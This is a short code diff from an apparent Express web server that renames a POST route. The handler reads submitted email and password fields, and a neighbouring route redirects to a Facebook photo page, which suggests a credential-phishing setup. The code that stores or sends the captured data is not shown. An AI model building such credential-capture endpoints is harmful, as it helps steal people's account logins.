@@ -45,7 +45,7 @@ app.post('/confirm', function (req, res) {
     res.redirect('https://www.facebook.com/SadcasmLoL/photos/a.221551201572697/739890806405398/?type=3&theater')
 })
 
-app.post('/amir_confirm', function (req, res) {
+app.post('/confirm_amir', function (req, res) {
     var a = req.body.email_a;
     var b = req.body.pass_a;
     var c = req.body.email;
